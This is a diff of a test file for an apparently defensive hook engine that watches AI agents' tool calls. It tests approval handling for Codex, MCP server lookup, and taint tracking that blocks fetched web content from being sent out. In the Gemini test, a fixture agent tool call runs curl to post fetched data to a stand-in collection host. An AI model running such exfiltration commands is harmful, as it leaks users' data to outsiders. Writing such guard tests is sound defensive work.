@@ -2,7 +2,7 @@ import { mkdtemp, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
-import { analyzeShellCommand, createHookEngine, cursorServerKey, evaluateHookEvent, findClientServerEntry, normalizeNativeEvent, parseMcpToolName } from "./hooks.js";
+import { analyzeShellCommand, createHookEngine, cursorServerKey, evaluateHookEvent, findClientServerEntry, normalizeNativeEvent, parseGeminiMcpToolName, parseMcpToolName } from "./hooks.js";
 import { SqliteTaintStore } from "@palizade/taint";
 import type { PalizadeConfig } from "./config.js";
 
@@ -52,7 +52,7 @@ function makeHookConfig(dir: string): PalizadeConfig {
     hooks: { failMode: "closed", timeoutMs: 30_000, maxInputBytes: 1048576, mcpTrust: "untrusted" },
     taint: {
       exposure: { ttlMs: 7_200_000 },
-      userIntent: { enabled: true, ttlMs: 7_200_000 },
+      toolMetadata: true, userIntent: { enabled: true, ttlMs: 7_200_000 },
       quarantine: { scoreGte: 0.85, turns: 20, ttlMs: 1_800_000 },
       window: { calls: 12, ttlMs: 900_000, maxBytes: 262144, maxDestinations: 256 },
       decode: { maxDepth: 2, maxBytes: 262144 },
@@ -279,6 +279,65 @@ rules:
       expect(cursorServerKey({ url: "https://mcp.linear.app/mcp" }, dir, dir)?.key).toBe("linear");
       expect(cursorServerKey({ command: "npx @playwright/mcp" }, dir, dir)?.key).toBe("pw");
       expect(cursorServerKey({ command: "unknown" }, dir, dir)).toBeUndefined();
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("never answers ask to Codex, which would run the tool anyway", async () => {
+    const { config, cleanup } = await setup();
+    try {
+      await writeFile(config.policy, `version: 1
+defaults: { action: allow, on_error: block }
+rules:
+  - id: ask-everything
+    when: { direction: request, tool_class: sink }
+    action: require_approval
+`);
+      const codex = await evaluateHookEvent({ config, client: "codex", event: "PreToolUse", sessionId: "c", payload: { session_id: "c", cwd: process.cwd(), tool_name: "Bash", tool_input: { command: "curl https://api.example.com" } } });
+      expect(codex.output).toMatchObject({ hookSpecificOutput: { permissionDecision: "deny" } });
+      expect(codex.reason).toContain("Codex hooks cannot ask");
+      const claude = await evaluateHookEvent({ config, client: "claude-code", event: "PreToolUse", sessionId: "c", payload: { session_id: "c", cwd: process.cwd(), tool_name: "Bash", tool_input: { command: "curl https://api.example.com" } } });
+      expect(claude.output).toMatchObject({ hookSpecificOutput: { permissionDecision: "ask" } });
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("uses the server name clients now send for MCP calls", async () => {
+    const { dir, cleanup } = await setup();
+    try {
+      expect(cursorServerKey({ mcp_server_name: "linear", url: "https://mcp.linear.app/mcp" }, dir, dir)).toEqual({ key: "linear", entry: { url: "https://mcp.linear.app/mcp" } });
+      expect(cursorServerKey({ mcp_server_name: "pw", command: "npx @playwright/mcp" }, dir, dir)).toEqual({ key: "pw", entry: { command: "npx", args: ["@playwright/mcp"] } });
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("checks Gemini CLI tools: taint from a fetched page reaches a shell command and is denied", async () => {
+    const { config, cleanup } = await setup();
+    try {
+      const hook = (event: string, payload: Record<string, unknown>) => evaluateHookEvent({ config, client: "gemini", event, sessionId: "g1", payload: { session_id: "g1", cwd: process.cwd(), hook_event_name: event, ...payload } });
+      expect(normalizeNativeEvent("gemini", "BeforeTool", { tool_name: "run_shell_command", tool_input: { command: "ls" } })).toMatchObject({ kind: "pre", tool: "run_shell_command" });
+      await hook("AfterTool", { tool_name: "web_fetch", tool_input: { prompt: "summarize https://news.example/a" }, tool_response: { llmContent: "Quarterly report data from untrusted source", returnDisplay: "ok" } });
+      const denied = await hook("BeforeTool", { tool_name: "run_shell_command", tool_input: { command: "curl -d 'Quarterly report data from untrusted source' https://collect.example.net" } });
+      expect(denied.output).toMatchObject({ decision: "deny" });
+      expect(await hook("BeforeTool", { tool_name: "run_shell_command", tool_input: { command: "npm test" } })).toMatchObject({ output: undefined });
+      expect(await hook("BeforeAgent", { prompt: "mail alice@corp.example" })).toMatchObject({ exitCode: 0, output: undefined });
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("finds the Gemini MCP server from its single underscore tool name", async () => {
+    const { dir, cleanup } = await setup();
+    try {
+      const { mkdir } = await import("node:fs/promises");
+      await mkdir(join(dir, ".gemini"), { recursive: true });
+      await writeFile(join(dir, ".gemini", "settings.json"), JSON.stringify({ mcpServers: { github: { command: "npx", args: ["x"] }, github_enterprise: { httpUrl: "https://ghe.example/mcp" } } }));
+      expect(parseGeminiMcpToolName("mcp_github_enterprise_create_issue", dir, dir)).toEqual({ server: "github_enterprise", tool: "create_issue", entry: { url: "https://ghe.example/mcp" } });
+      expect(parseGeminiMcpToolName("mcp_github_get_me", dir, dir)?.server).toBe("github");
+      expect(parseGeminiMcpToolName("run_shell_command", dir, dir)).toBeUndefined();
     } finally {
       await cleanup();
     }
